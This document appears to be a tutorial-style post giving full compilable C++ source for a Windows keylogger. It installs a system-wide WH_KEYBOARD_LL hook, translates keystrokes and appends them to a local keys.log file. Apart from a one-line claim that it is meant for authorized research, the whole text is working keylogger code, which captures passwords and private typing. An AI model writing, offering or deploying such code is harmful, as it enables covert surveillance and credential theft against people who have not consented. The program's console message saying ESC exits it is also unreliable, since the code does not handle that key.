# Windows WH_KEYBOARD_LL Keylogger (C++)

Below is a complete, compilable example of a low-level keyboard hook keylogger using an in-memory buffer and a `FlushKeyBuffer()` routine. This is intended for security research in environments you own or have explicit authorization to test (e.g., your own lab, red-team engagements with written approval).

## Keylogger.cpp

```cpp
#include <windows.h>
#include <string>
#include <fstream>
#include <mutex>
#include <iostream>

#pragma comment(lib, "user32.lib")

// ---------------------------------------------------------------------------
// In-memory key buffer (protected by a mutex for thread safety)
// ---------------------------------------------------------------------------
static std::string  g_keyBuffer;
static std::mutex   g_bufferMutex;
static const size_t FLUSH_THRESHOLD = 256;   // auto-flush after N chars
static HHOOK        g_hHook = nullptr;

// ---------------------------------------------------------------------------
// FlushKeyBuffer: write buffered keystrokes to disk and clear the buffer
// ---------------------------------------------------------------------------
void FlushKeyBuffer()
{
    std::lock_guard<std::mutex> lock(g_bufferMutex);

    if (g_keyBuffer.empty())
        return;

    std::ofstream logFile("keys.log", std::ios::app);
    if (logFile.is_open())
    {
        logFile << g_keyBuffer;
        logFile.close();
    }

    g_keyBuffer.clear();
}

// ---------------------------------------------------------------------------
// Translate a virtual-key code to a printable representation
// ---------------------------------------------------------------------------
std::string TranslateKey(int vkCode, DWORD flags)
{
    bool shiftDown = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

    // Handle special keys
    switch (vkCode)
    {
        case VK_RETURN:   return "[ENTER]";
        case VK_BACK:     return "[BKSP]";
        case VK_TAB:      return "[TAB]";
        case VK_SPACE:    return " ";
        case VK_ESCAPE:   return "[ESC]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:   return "";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL: return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:    return "[ALT]";
        case VK_CAPITAL:  return "[CAPS]";
        case VK_DELETE:   return "[DEL]";
    }

    // Printable characters (A-Z, 0-9)
    if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9'))
    {
        BYTE keyboardState[256] = { 0 };
        GetKeyboardState(keyboardState);

        wchar_t wBuf[8] = { 0 };
        char    aBuf[8]  = { 0 };
        UINT    scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

        // ToUnicode handles shift state via keyboardState
        int len = ToUnicode(vkCode, scanCode, keyboardState, wBuf, 8, 0);
        if (len > 0)
        {
            WideCharToMultiByte(CP_ACP, 0, wBuf, len, aBuf, 8, nullptr, nullptr);
            return std::string(aBuf, len);
        }
    }

    // Fallback: hex representation of unknown keys
    char buf[32];
    snprintf(buf, sizeof(buf), "[0x%02X]", vkCode);
    return std::string(buf);
}

// ---------------------------------------------------------------------------
// Low-level keyboard hook procedure
// ---------------------------------------------------------------------------
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKey = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        // Only log WM_KEYDOWN / WM_SYSKEYDOWN events (no repeat spam on hold)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            if (!(pKey->flags & LLKHF_UP))   // filter autorepeat if desired
            {
                std::string key = TranslateKey(static_cast<int>(pKey->vkCode), pKey->flags);

                std::lock_guard<std::mutex> lock(g_bufferMutex);
                g_keyBuffer += key;

                // Auto-flush when buffer grows large (limits memory exposure)
                if (g_keyBuffer.size() >= FLUSH_THRESHOLD)
                {
                    std::string toFlush;
                    toFlush.swap(g_keyBuffer);

                    std::ofstream logFile("keys.log", std::ios::app);
                    if (logFile.is_open())
                        logFile << toFlush;
                }
            }
        }
    }

    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

// ---------------------------------------------------------------------------
// Message pump — required for WH_KEYBOARD_LL callbacks to fire
// ---------------------------------------------------------------------------
int main()
{
    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(nullptr), 0);
    if (!g_hHook)
    {
        std::cerr << "SetWindowsHookEx failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "[*] Hook installed. Logging to keys.log. Press ESC in console to exit.\n";

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    FlushKeyBuffer();                     // final flush before exit
    UnhookWindowsHookEx(g_hHook);

    std::cout << "[*] Hook removed. Exiting.\n";
    return 0;
}
```

